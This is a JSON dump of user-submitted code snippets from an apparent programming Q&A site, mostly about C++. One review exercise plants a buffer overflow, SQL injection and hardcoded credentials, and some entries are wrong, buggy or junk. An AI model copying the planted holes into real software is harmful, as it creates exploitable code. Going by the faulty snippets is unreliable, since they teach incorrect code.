[
  {
    "id": 1,
    "keyword": null,
    "link": "                                                                        ",
    "title": "  code-examples                                                                          ",
    "description": "no response\r\n                    \r\n                    \r\n                    ",
    "reg_date": "2021-11-01T15:04:58.000Z"
  },
  {
    "id": 2,
    "keyword": null,
    "link": null,
    "title": "  code-examples  cpp",
    "description": "",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 3,
    "keyword": null,
    "link": null,
    "title": " \"++i + ++i\" explanation",
    "description": "int i = 5; i = ++i + ++i; cout<<i; \n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 4,
    "keyword": null,
    "link": null,
    "title": " \"convertir python a c ++",
    "description": "import sys  total=0 #cuenta el total de pixeles cont=0 #cuanta aquellos <=1  def Leer (archivo):      global total      global cont      f=open(archivo,'r')      while(1):         linea=f.readline()         linea=linea[:-1] ####         if(len(linea)>0):           y=linea.split(\";\")           print(y)           total=total+len(y)           for i in range(len(y)):             if(int(y[i])<=1):                 cont+=1 \t####         if not linea:             break      f.close() #### Leer (\"imagen.txt\") print (total)  while(1): \tprint(\"1.Cargar Imagen\\n 2.Evaluar Imagen\\n 3.salir\\n\") \tx=int(input(\"Ingrese una opcion:\\n\")) \t \tif (x==1): \t\ttotal=0 \t\tcont=0  \t\tprint(\"Cargar Imagen\") \t\tLeer(\"imagen.txt\") \t \tif(x==2): \t\tprint(\"Evaluando imagen\") \t\tprint(\"TOTAL:\"+str(total)) \t\tprint(\"CONT:\"+str(cont)) \t \t\tp=(cont/total)*100 \t \t\tif(p>=50): \t\t\tprint(\"Probabilidad de cobre: ALTA\") \t\tif(p>=30 and p<50): \t\t\tprint(\"Probabilidad de cobre: MEDIA\") \t\tif(p<50): \t\t\tprint(\"Probabilidad de cobre: BAJA\") \tif(x==3): \t\tprint(\"adios\")\t \t\tsys.exit(0) \t \t\n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 5,
    "keyword": null,
    "link": null,
    "title": " \"how we write a program for\" time swap\" in c plus plus only with string\"",
    "description": "why \n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 6,
    "keyword": null,
    "link": null,
    "title": " # in c++",
    "description": "You can use '#' sign to get exact name of an argument passed to a macro: #define what_is(x) cerr << #x << \" is \" << x << endl; int variable = 376; what_is(variable); // prints \"variable is 376\"\n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 7,
    "keyword": null,
    "link": null,
    "title": " #defie in c++",
    "description": "#define token [value] \n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 8,
    "keyword": null,
    "link": null,
    "title": " #define in cpp",
    "description": "#include <iostream>     // macro definition  #define LIMIT 5   int main()  {      for (int i = 0; i < LIMIT; i++) {          std::cout << i << \"\\n\";      }         return 0;  } \n#define SPEED ios::sync_with_stdio(false); cin.tie(0); cout.tie(0) #define ar array #define ll long long #define pb push_back\n// The #define preprocessor directive creates symbolic constants #include <iostream> using namespace std;  #define CONSTANT 2.71828  int main () {    cout << \"Declared constant: \" << CONSTANT << endl;      return 0; }\n// #define is a macro that lets you use an alias name to // make code more readable. During C++'s preproccessing stage, your macro // will be replaced with the suitable code needed for proper compiling.   #include <iostream> // used to define constants, types, functions and more....  #define SIZE 5  #define MacroInt int  #define getmax(a,b) ((a)>(b)?(a):(b))  int main(){   \tMacroInt myIntAsMacro = 7;     std::cout<< getmax(SIZE, myIntAsMacro); // will return 7 } \n",
    "reg_date": "2021-10-12T11:36:23.000Z"
  },
  {
    "id": 9,
    "keyword": null,
    "link": null,
    "title": " #define online judge in cpp",
    "description": "#ifndef ONLINE_JUDGE   freopen(\"input.txt\", \"r\", stdin);   freopen(\"output.txt\", \"w\", stdout); #endif // ONLINE_JUDGE \n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 10,
    "keyword": null,
    "link": null,
    "title": " #include<bits/stdc++.h>",
    "description": "#include<bits/stdc++.h>\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 11,
    "keyword": null,
    "link": null,
    "title": " #include",
    "description": "#include <stdio.h> #include \"filename.h\"  void main{   codefromfilename();   return 0; }\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 12,
    "keyword": null,
    "link": null,
    "title": " #include <stdio.h> cpp",
    "description": "Input and Output operations can also be performed in C++ using the C Standard Input and Output Library (cstdio, known as stdio.h in the C language). This library uses what are called streams to operate with physical devices such as keyboards, printers, terminals or with any other type of files supported by the system. Streams are an abstraction to interact with these in an uniform way; All streams have similar properties independently of the individual characteristics of the physical media they are associated with.\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 13,
    "keyword": null,
    "link": null,
    "title": " #include using namespace std; int main() { double leashamt,collaramt,foodamt,totamt; cout<<\"Enter the amount spent for a leash : \";",
    "description": "#include using namespace std; int main() {     double leashamt,collaramt,foodamt,totamt;     cout<<\"Enter the amount spent for a leash : \";  \n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 14,
    "keyword": null,
    "link": null,
    "title": " #pragma GCC target (\"avx2\") #pragma GCC optimization (\"O3\") #pragma GCC optimization (\"unroll-loops\")",
    "description": "#pragma GCC target (\"avx2\") #pragma GCC optimization (\"O3\") #pragma GCC optimization (\"unroll-loops\")\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 15,
    "keyword": null,
    "link": null,
    "title": " && c++",
    "description": "//if both statements are true, return True //if neither is true or one is false, return True\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 16,
    "keyword": null,
    "link": null,
    "title": " & before function arg in cpp",
    "description": "// pass 'x' by reference void f1(int &x){ \t... }  // pass 'x' by value void f2(int x){ \t... }\n",
    "reg_date": "2021-10-12T11:36:24.000Z"
  },
  {
    "id": 17,
    "keyword": null,
    "link": null,
    "title": " & in xml",
    "description": "<string name=\"magazine\">Newspaper &amp; Magazines</string>\n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 18,
    "keyword": null,
    "link": null,
    "title": " &lt",
    "description": "#include <iostream>  #include <cstdlib>   using namespace std;   int main () {   int i;   cout<< \"Check if command processor is available...\"<<endl;   if (system(NULL)) cout << \"command processor is available!!\"<<endl;     else exit (EXIT_FAILURE);   cout<< \"Executing command DIR...\"<<endl;   i=system (\"dir\");   cout << \"The value returned was:\"<<i<<endl;   return 0; } \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 19,
    "keyword": null,
    "link": null,
    "title": " '?' in arduino",
    "description": "x = (val == 10) ? 20 : 15; \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 20,
    "keyword": null,
    "link": null,
    "title": " 'fopen': This function or variable may be unsafe. Consider using fopen s instead. To disable deprecation, use  CRT SECURE NO WARNINGS",
    "description": "#define _CRT_SECURE_NO_DEPRECATE #include <stdio.h> \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 21,
    "keyword": null,
    "link": null,
    "title": " ('Failed to import pydot. You must `pip install pydot` and install graphviz (https://graphviz.gitlab.io/download/), ', 'for `pydotprint` to work.')",
    "description": "pip install pydot==1.2.3\nfrom keras.models import Sequential from keras.layers import Dense from keras.utils.vis_utils import plot_model import os os.environ[\"PATH\"] += os.pathsep + 'C:/Program Files (x86)/Graphviz2.38/bin/' model = Sequential() model.add(Dense(2, input_dim=1, activation='relu')) model.add(Dense(1, activation='sigmoid')) plot_model(model, to_file='model_plot.png', show_shapes=True, show_layer_names=True)\nconda uninstall pydot conda uninstall pydotplus conda uninstall graphviz  and then  conda install pydot conda install pydotplus  p.s (graphviz get installed with pydot)\n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 22,
    "keyword": null,
    "link": null,
    "title": " (1 & 1) in cpp",
    "description": " (A[j] & 1) \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 23,
    "keyword": null,
    "link": null,
    "title": " *= c++",
    "description": "*=   \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 24,
    "keyword": null,
    "link": null,
    "title": " +++++++++",
    "description": "\\\\\\\\\\\\\\\\\\\\\\ \n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 25,
    "keyword": null,
    "link": null,
    "title": " ++ how to write quotation mark in  a string",
    "description": "const char* text = \"The man said \\\"Where are we going?\\\"\";\n",
    "reg_date": "2021-10-12T11:36:25.000Z"
  },
  {
    "id": 26,
    "keyword": null,
    "link": null,
    "title": " ++x vs x++",
    "description": "x++ //after assignment ++x //before assignment\n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 27,
    "keyword": null,
    "link": null,
    "title": " +=",
    "description": ">>> a = 10 >>> a += 5 >>> a 15 \naddition assignment operator\nx+=y means x=x+y\nlet a = 2;  console.log(a += 3); // addition // expected output: 5  // here 'a += 3' is equal to 'a = a + 3'\n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 28,
    "keyword": null,
    "link": null,
    "title": " // Online C++ compiler to run C++ program online #include <iostream>  int main() {     // Write C++ code here     std::cout << \"Hello world!\";      return 0; }",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 29,
    "keyword": null,
    "link": null,
    "title": " << in c++",
    "description": "template<typename T> std::ostream & operator << (std::ostream & out, const std::vector<T> & v) {       for(size_t i = 0 ; i < v.size(); i++ )          out << v[i] << std::endl;       return out; } \n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 30,
    "keyword": null,
    "link": null,
    "title": " ? in cpp",
    "description": "int nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\ne = ((a < d) ? (a++) : (a = d))   //advance if else condition\nint foo [5];\n#include <iostream>     // macro definition  #define LIMIT 5   int main()  {      for (int i = 0; i < LIMIT; i++) {          std::cout << i << \"\\n\";      }         return 0;  } \nYou can use '#' sign to get exact name of an argument passed to a macro: #define what_is(x) cerr << #x << \" is \" << x << endl; int variable = 376; what_is(variable); // prints \"variable is 376\"\n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 31,
    "keyword": null,
    "link": null,
    "title": " \\frac{2}{5}MR^2 typed in c++",
    "description": "\\frac{2}{5}MR^2\n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 32,
    "keyword": null,
    "link": null,
    "title": " \\t in c++",
    "description": "/n //next line /t //horizontal tab \n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 33,
    "keyword": null,
    "link": null,
    "title": " ‘setprecision’ was not declared in this scope",
    "description": "//You have to include header file #include <iomanip> \nint x = 109887; cout << fixed << setprecision(3) << x;\n",
    "reg_date": "2021-10-12T11:36:26.000Z"
  },
  {
    "id": 34,
    "keyword": null,
    "link": null,
    "title": " . Shell sort in c++",
    "description": "#include  <iostream>  using namespace std;      int shellSort(int arr[], int n)  {       for (int gap = n/2; gap > 0; gap /= 2)      {                     for (int i = gap; i < n; i += 1)          {                          int temp = arr[i];                             int j;                          for (j = i; j >= gap && arr[j - gap] > temp; j -= gap)                  arr[j] = arr[j - gap];                                          arr[j] = temp;          }      }      return 0;  }     void printArray(int arr[], int n)  {      for (int i=0; i<n; i++)          cout << arr[i] << \" \";  }     int main()  {      int arr[] = {12, 34, 54, 2, 3}, i;      int n = sizeof(arr)/sizeof(arr[0]);         cout << \"Array before sorting: \\n\";      printArray(arr, n);         shellSort(arr, n);         cout << \"\\nArray after sorting: \\n\";      printArray(arr, n);         return 0; }\n05,04,09,19,15,14,10,15,20,01\n05,04,09,19,15,14,10,15,20,01\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 35,
    "keyword": null,
    "link": null,
    "title": " .front() c++",
    "description": "// queue::front #include <iostream>       // std::cout #include <queue>          // std::queue  int main () {   std::queue<int> myqueue;    myqueue.push(77);   myqueue.push(16); \tcout << myqueue.front();   myqueue.front() -= myqueue.back();    // 77-16=61    std::cout << \"myqueue.front() is now \" << myqueue.front() << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 36,
    "keyword": null,
    "link": null,
    "title": " .gitignore for c++",
    "description": "# Prerequisites *.d  # Compiled Object files *.slo *.lo *.o *.obj  # Precompiled Headers *.gch *.pch  # Compiled Dynamic libraries *.so *.dylib *.dll  # Fortran module files *.mod *.smod  # Compiled Static libraries *.lai *.la *.a *.lib  # Executables *.exe *.out *.app\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 37,
    "keyword": null,
    "link": null,
    "title": " .push back function c++",
    "description": "// push_back equivalent ArrayList<int> a = new ArrayList<int>(); a.add(2);             // Add element to the ArrayList. a.add(4);  // pop_back equivalent. a.remove(a.size()-1); // Remove the last element from the ArrayList.\n(Things).push_back(Items)\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 38,
    "keyword": null,
    "link": null,
    "title": " .txt file into .cpp",
    "description": "#include<iostream> #include<fstream>  using namespace std;  int main() {   ifstream myReadFile;  myReadFile.open(\"text.txt\");  char output[100];  if (myReadFile.is_open()) {  while (!myReadFile.eof()) {       myReadFile >> output;     cout<<output;    } } myReadFile.close(); return 0; }  \n#include <stdio.h> #include <stdlib.h> #include <string> #include <iostream>  /* Premise:  We have a top secret file that only authorized users are allowed to download, and they need a CLI tool for retrieving it. We tasked a developer with building the server and client for this. He built the client first, and has sent you his code for review.  What feedback, questions, or concerns would you give the developer after reviewing his client.  */ bool userIsFound(std::string query) {   // Pretend this method actually executes an SQL query instead of always returning true   return true; }  void fetchHttpFile(std::string url) {   // Pretend the code for this lives somewhere else }  int main (int argc, char* argv[]) {   char username[20];   char password[20];   strcpy(username, argv[1]);   strcpy(password, argv[2]);    std::string query = \"SELECT * FROM users WHERE username=\" + std::string(username) + \" AND password=\" + std::string(password);   std::string url = \"http://secretuser:secretpassword@www.example.com/secretfile\";    if (userIsFound(query)) {     fetchHttpFile(url);     std::cout << \"Downloading file: \" + url;     exit (EXIT_SUCCESS);   }   else   {     std::cout << \"Error downloading file: \" + url + \" You do not have permission.\";     exit (EXIT_FAILURE);   } }\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 39,
    "keyword": null,
    "link": null,
    "title": " 0-1 knapsack problem",
    "description": "#Returns the maximum value that can be stored by the bag  def knapSack(W, wt, val, n):    # initial conditions    if n == 0 or W == 0 :       return 0    # If weight is higher than capacity then it is not included    if (wt[n-1] > W):       return knapSack(W, wt, val, n-1)    # return either nth item being included or not    else:       return max(val[n-1] + knapSack(W-wt[n-1], wt, val, n-1),          knapSack(W, wt, val, n-1)) # To test above function val = [50,100,150,200] wt = [8,16,32,40] W = 64 n = len(val) print (knapSack(W, wt, val, n))\n#include<bits/stdc++.h> using namespace std; vector<pair<int,int> >a; //dp table is full of zeros int n,s,dp[1002][1002]; void ini(){     for(int i=0;i<1002;i++)         for(int j=0;j<1002;j++)             dp[i][j]=-1; } int f(int x,int b){ \t//base solution \tif(x>=n or b<=0)return 0; \t//if we calculate this before, we just return the answer (value diferente of 0) \tif(dp[x][b]!=-1)return dp[x][b]; \t//calculate de answer for x (position) and b(empty space in knapsack) \t//we get max between take it or not and element, this gonna calculate all the \t//posible combinations, with dp we won't calculate what is already calculated. \treturn dp[x][b]=max(f(x+1,b),b-a[x].second>=0?f(x+1,b-a[x].second)+a[x].first:INT_MIN); } int main(){ \t//fast scan and print \tios_base::sync_with_stdio(0);cin.tie(0); \t//we obtain quantity of elements and size of knapsack \tcin>>n>>s; \ta.resize(n); \t//we get value of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].first; \t//we get size of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].second; \t//initialize dp table \tini(); \t//print answer \tcout<<f(0,s); \treturn 0; } \n//RECURSSION+MEMOIZATION #include <bits/stdc++.h> using namespace std; int dp[1001][1001]; int knapsack(vector<pair<int,int>>&value,int w,int n) {     if(w==0||n==0)     {         return 0;     }     if(dp[n][w]!=-1)     {         return dp[n][w];     }         if(value[n-1].first<=w)         {              return (dp[n][w]=max((value[n-1].second)+knapsack(value,w-(value[n-1].first),n-1),knapsack(value,w,n-1)));         }         else         {             return dp[n][w]=knapsack(value,w,n-1);         } } int main() {     memset(dp,-1,sizeof(dp));     int n;     cout<<\"ENTER THE  NUMBER OF ITEMS: \"<<endl;     cin>>n;     vector<pair<int,int>>value;     for(int i=0;i<n;i++)     {         int a,b;         cin>>a>>b;         value.push_back(make_pair(a,b));//a->weight and b->price     }     //sort according to value[i].second in ascending order      int w;     cout<<\"ENTER THE MAX. CAPACITY OF THE KNAPSACK: \";     cin>>w;     cout<<endl;     cout<<knapsack(value,w,n);      return 0; } \n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 40,
    "keyword": null,
    "link": null,
    "title": " 0-1 pattern in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=1;i<=n;i++){ \t\tfor(int j=1;j<=i;j++){ \t\t\tif((i+j)%2==0){cout<<\"1\"; \t\t\t} \t\t\telse{ \t\t\t\tcout<<\"0\"; \t\t\t} \t\t\t \t\t}cout<<endl; \t} \treturn 0; \t }\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 41,
    "keyword": null,
    "link": null,
    "title": " 0009:err:mscoree:CLRRuntimeInfo GetRuntimeHost Wine Mono is not installed",
    "description": "sudo apt-get install mono-complete //if didn't work you can search for how to install .net5 on linux\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 42,
    "keyword": null,
    "link": null,
    "title": " 1+1",
    "description": "1+1  By using the fundamental theorem of common sense, we get the result 2.\n1+1 = 2\nYou Knew This Answer\nI think.....\nU DUMB BRO??? 1+1 is OBVIOUSLY 3!\n&ldquo;1&rdquo; + &ldquo;1&rdquo; == 11\n2 = 1 + 1;\n2 smooth brain\nhuh 8\nMY GUY ITS 2 HOW DO YOU NOT KNOW THIS????\n",
    "reg_date": "2021-10-12T11:36:27.000Z"
  },
  {
    "id": 43,
    "keyword": null,
    "link": null,
    "title": " 1162261467",
    "description": "3^19 = 1162261467\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 44,
    "keyword": null,
    "link": null,
    "title": " 130 divided by -10",
    "description": "loser \n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 45,
    "keyword": null,
    "link": null,
    "title": " 16630147",
    "description": "AFK until I get donated enough for Red Tango  tags: hey, heyrosalina, rosalina, afk, until, donation, center\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 46,
    "keyword": null,
    "link": null,
    "title": " 1d fixed length arrays c++",
    "description": "void initarr(int arrgender[TOT_MALE][TOT_FEMALE])   {       for(int a =0; a < TOT_MALE;a++)       {           for(int b = 0; b < TOT_FEMALE;b++)           {               arrgender[a][b] = 0;           }       }\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 47,
    "keyword": null,
    "link": null,
    "title": " 2000pp pp play osu std",
    "description": "never.\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 48,
    "keyword": null,
    "link": null,
    "title": " 23",
    "description": "#include<stdio.h> #include<conio.h> #include<alloc.h> #include<stdlib.h>   struct process {    int no;    int priority;    int active;    struct process *next; }; typedef struct process proc;   struct priority {    int pri;    struct priority *next;    proc *pp; }; typedef struct priority pri;   pri* find_priority(proc *head, pri *head1) {    proc *p1;    pri *p2, *p3;    p1 = head;      while (p1->next != head) {       if (p1->active == 1) {          if (head1 == NULL) {             head1 = (pri*) malloc(sizeof(pri));             head1->pri = p1->priority;             head1->next = NULL;             head1->pp = p1;             p2 = head1;          } else {             p3 = (pri*) malloc(sizeof(pri));             p3->pri = p1->priority;             p3->pp = p1;             p3->next = NULL;             p2->next = p3;             p2 = p2->next;          }          p1 = p1->next;       } else          p1 = p1->next;    } //end while        p3 = (pri*) malloc(sizeof(pri));    p3->pri = p1->priority;    p3->pp = p1;    p3->next = NULL;    p2->next = p3;    p2 = p2->next;    p3 = head1;      return head1; } //end find_priority()   int find_max_priority(pri *head) {    pri *p1;    int max = -1;    int i = 0;    p1 = head;      while (p1 != NULL) {       if (max < p1->pri && p1->pp->active == 1) {          max = p1->pri;          i = p1->pp->no;       }       p1 = p1->next;    }    return i; }   void bully() {    proc *head;    proc *p1;    proc *p2;    int n, i, pr, maxpri, a, pid, max, o;    char ch;      head = p1 = p2 = NULL;      printf(\"\\nnEnter how many process: \");    scanf(\"%d\", &n);      for (i = 0; i < n; i++) {       printf(\"\\nEnter priority of process %d: \", i + 1);       scanf(\"%d\", &pr); \t         printf(\"\\nIs process with id %d is active ?(0/1) :\", i + 1);       scanf(\"%d\", &a);        \t  if (head == NULL) {          head = (proc*) malloc(sizeof(proc));          if (head == NULL) {             printf(\"\\nMemory cannot be allocated\");             getch();             exit(0);          }          head->no = i + 1;          head->priority = pr;          head->active = a;          head->next = head;          p1 = head;       } else {          p2 = (proc*) malloc(sizeof(proc));          if (p2 == NULL) {             printf(\"\\nMemory cannot be allocated\");             getch();             exit(0);          }          p2->no = i + 1;          p2->priority = pr;          p2->active = a;          p1->next = p2;          p2->next = head;          p1 = p2;       }    } //end for      printf(\"\\nEnter the process id that invokes election algorithm: \");    scanf(\"%d\", &pid);    p2 = head;    while (p2->next != head) {       if (p2->no == pid) {          p2 = p2->next;          break;       }       p2 = p2->next;    }      printf(\"\\nProcess with id %d has invoked election algorithm\", pid);    printf(\"\\t\\nElection message is sent to processes\");        while (p2->next != head) {       if (p2->no > pid)          printf(\"%d\", p2->no);       p2 = p2->next;    }      printf(\"%d\", p2->no);    p2 = head;    max = 0;      while (1) {       if (p2->priority > max && p2->active == 1)          max = p2->no;       p2 = p2->next;       if (p2 == head)          break;    }      printf(\"\\n\\tProcess with the id %d is the co-ordinator\", max);        while (1) {       printf(\"\\nDo you want to continue?(y/n): \");       flushall();       scanf(\"%c\", &ch);       if (ch == 'n' || ch == 'N')          break;       p2 = head;         while (1) {          printf(\"\\nEnter the process with id %d is active or not (0/1): \",                p2->no);          scanf(\"%d\", &p2->active);          p2 = p2->next;          if (p2 == head)             break;       } \t         printf(\"\\nEnter the process id that invokes election algorithm: \");       scanf(\"%d\", &pid); \t         printf(\"\\n\\tElection message is sent to processes \");         while (p2->next != head) {          if (p2->no > pid)             printf(\"%d\", p2->no);          p2 = p2->next;       }       printf(\"%d\", p2->no);       p2 = head;       max = 0;         while (1) {          if (p2->no > max && p2->active == 1)             max = p2->no;          p2 = p2->next;          if (p2 == head)             break;       }       printf(\"\\n\\tProcess with id %d is the co-ordinator\", max);    } }   void main() {    clrscr();    bully();    getch(); } \n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 49,
    "keyword": null,
    "link": null,
    "title": " 271533778232847",
    "description": "#include<conio.h> #include<iostream> using namespaace std int main() cout<<enter your name'\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 50,
    "keyword": null,
    "link": null,
    "title": " 2927260.eps 2927262.jpg 2927263.ai License free.txt License premium.txt",
    "description": "wyvbtf h  h gh0n8f]                hg g g hg yujhkjhlkjk                         hg ggy t vtbfdwt gsfd y gfth\ndhfgfd gfd fghgs gfhghdghg             yunbvtb     g ghvg ghdf\n",
    "reg_date": "2021-10-12T11:36:28.000Z"
  },
  {
    "id": 51,
    "keyword": null,
    "link": null,
    "title": " 2D point class in c++",
    "description": "class point {  private:     float x;     float y;  public:     point(float a = 0, float b = 0)     {         x = a;         y = b;         cout << \"***\" << x << \",\" << y << endl;     }     point operator+(point p)     {         point p3;         p3.x = this->x + p.x;         p3.y = this->y + p.y;          return p3;     }     friend point operator*(float a, point p)     {         return p * a;     }      point operator*(float a)     {         point p1;         p1.x = a * x;         p1.y = a * y;         return p1;     }      void print()     {         cout << this->x << \"\\n\"              << this->y << \"\\n\";     }     friend float get_x(point); }; float get_x(point p) {     return p.x; }\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 52,
    "keyword": null,
    "link": null,
    "title": " 2 Byte Integer R/W to Arduino’s EEPROM",
    "description": "#include <EEPROM.h> //Needed to access the eeprom read write functions  //This function will write a 2 byte integer to the eeprom at the specified address and address + 1 void EEPROMWriteInt(int p_address, int p_value)       {       byte lowByte = ((p_value >> 0) & 0xFF);       byte highByte = ((p_value >> 8) & 0xFF);        EEPROM.write(p_address, lowByte);       EEPROM.write(p_address + 1, highByte);       }  //This function will read a 2 byte integer from the eeprom at the specified address and address + 1 unsigned int EEPROMReadInt(int p_address)       {       byte lowByte = EEPROM.read(p_address);       byte highByte = EEPROM.read(p_address + 1);        return ((lowByte << 0) & 0xFF) + ((highByte << 8) & 0xFF00);       }  void setup()       {       Serial.begin(9600);              EEPROMWriteInt(0, 0xABCD);              Serial.print(\"Read the following int at the eeprom address 0: \");       Serial.println(EEPROMReadInt(0), HEX);       }  void loop()       {       } \n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 53,
    "keyword": null,
    "link": null,
    "title": " 2d array",
    "description": "int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5\n// Either int disp[2][4] = {   {10, 11, 12, 13},   {14, 15, 16, 17} };  // Or  int disp[2][4] = { 10, 11, 12, 13, 14, 15, 16, 17};  // OR int i, j; for (i = 0; i < HEIGHT; i++) { // iterate through rows   for (j = 0; j < WIDTH; j++) { // iterate through columns     disp[i][j] = disp[i][j];   } }\nint[][] arr = new int[row][column]; \narray = [[value] * lenght] * height  //example array = [[0] * 5] * 10  print(array)\n//Length int[][]arr= new int [filas][columnas]; arr.length=filas;          int[][] a = {             {1, 2, 3},              {4, 5, 6, 9},              {7},          };                // calculate the length of each row         System.out.println(\"Length of row 1: \" + a[0].length);         System.out.println(\"Length of row 2: \" + a[1].length);         System.out.println(\"Length of row 3: \" + a[2].length);     }\nint disp[2][4] = { 10, 11, 12, 13, 14, 15, 16, 17};\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 54,
    "keyword": null,
    "link": null,
    "title": " 2d array c++",
    "description": "int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5\nint** arr = new int*[10]; // Number of Students int i=0, j; for (i; i<10; i++)  \tarr[i] = new int[5]; // Number of Courses /*In line[1], you're creating an array which can store the addresses   of 10 arrays. In line[4], you're allocating memories for the    array addresses you've stored in the array 'arr'. So it comes out    to be a 10 x 5 array. */\n#include <iostream> using namespace std; int main(){ \tint n,m; \tint a[n][m]; \tcin >> n >>m; \tfor ( int i=0; i<n; i++){ \t\tfor (int j=0; j<m; j++){ \t\t\tcin >> a[i][j]; \t\t} \t} \t \tfor ( int x=0; x<n; x++){ \t\tfor (int y=0; y<m; y++){ \t\t\tcout << \"a[\" << x << \"][\" << y << \"]: \"; \t\t\tcout << a[x][y] << endl; \t\t} \t} \treturn 0; }\n int main()  {      int row = 5; // size of row      int colom[] = { 5, 3, 4, 2, 1 };         vector<vector<int> > vec(row);  // Create a vector of vector with size equal to row.    \tfor (int i = 0; i < row; i++) {    \t\tint col;           col = colom[i];    \t\tvec[i] = vector<int>(col); //Assigning the coloumn size of vector         for (int j = 0; j < col; j++)              vec[i][j] = j + 1;      }         for (int i = 0; i < row; i++) {          for (int j = 0; j < vec[i].size(); j++)              cout << vec[i][j] << \" \";          cout << endl;      }  } \n#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3; 9 10 void printMatrix(array<array<int, COLS>, ROWS> matrix){ 11 //for each row 12 for (int row = 0; row < matrix.size(); ++row){ 13 //for each element in the current row 14 for (int col = 0; col < matrix[row].size(); ++col){ 15 cout << matrix[row][col] << ' '; 16 } 17 cout << endl; 18 } 19 }\nvoid printMatrix(array<array<int, COLS>, ROWS> matrix){ for (auto row : matrix){ //auto infers that row is of type array<int, COLS> for (auto element : row){ cout << element << ' '; } cout << endl; }\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 55,
    "keyword": null,
    "link": null,
    "title": " 2d array finding neighbors c++",
    "description": "#include <stdio.h>  #define ROWS 8 #define COLS 8  typedef int matrix_t[ROWS][COLS];  static int sum(matrix_t &matrix, int row, int col) {     int sum = 0;     for (int i = -1; i < 2; i++)     {         for (int j = -1; j < 2; j++)         {             // skip center cell             if (i == j) continue;             // skip rows out of range.             if ( (i + row) < 0 || (i + row >= ROWS) continue;             // skip columns out of range.             if ( (j + col) < 0 || (j + col >= COLS) continue;             // add to sum.             sum += matrix[i + row][j + col];         }     }     return sum; }  static int make(matrix_t &result, const matrix_t &source) {     for (int i = 0; i < ROWS; i++)         for (int j = 0; j < COLS; j++)             result[i][j] = sum(source, i, j); }  // print a matrix to stdout. static int print(const matrix_t &source) {     for (int i = 0; i < ROWS; i++)     {         for (int j = 0; j < COLS; j++)             printf(\"\\t%d\", source[i][j]);         printf(\"\\n\");     } }  // unit test int main(int argc, char *argv[]) {     matrix_t result = {0};     const matrix_t source =     {         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 